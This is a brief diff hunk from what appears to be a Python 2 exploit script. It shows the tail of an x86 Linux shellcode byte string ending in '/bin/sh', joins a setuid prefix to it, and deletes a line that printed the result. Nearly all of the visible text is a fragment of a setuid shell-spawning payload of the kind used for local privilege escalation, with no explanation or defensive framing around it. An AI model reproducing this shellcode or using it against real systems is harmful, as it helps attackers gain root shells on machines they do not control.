@@ -4,4 +4,3 @@ bin_sh = (
     '\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
 
 shellcode = setuid + bin_sh
-print shellcode
